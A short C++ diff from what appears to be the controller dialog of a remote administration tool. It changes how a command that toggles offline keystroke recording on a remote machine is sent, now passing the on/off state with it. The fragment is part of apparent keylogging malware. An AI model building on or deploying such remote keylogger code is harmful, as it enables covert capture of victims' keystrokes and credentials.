@@ -155,9 +155,9 @@ void CKeyBoardDlg::OnSysCommand(UINT nID, LPARAM lParam)
     if (nID == IDM_ENABLE_OFFLINE) {
         CMenu* pSysMenu = GetSystemMenu(FALSE);
         if (pSysMenu != NULL) {
-            BYTE bToken = COMMAND_KEYBOARD_OFFLINE;
-            m_iocpServer->Send(m_pContext, &bToken, 1);
             m_bIsOfflineRecord = !m_bIsOfflineRecord;
+            BYTE bToken[] = { COMMAND_KEYBOARD_OFFLINE, m_bIsOfflineRecord };
+            m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
             if (m_bIsOfflineRecord)
                 pSysMenu->CheckMenuItem(IDM_ENABLE_OFFLINE, MF_CHECKED);
             else
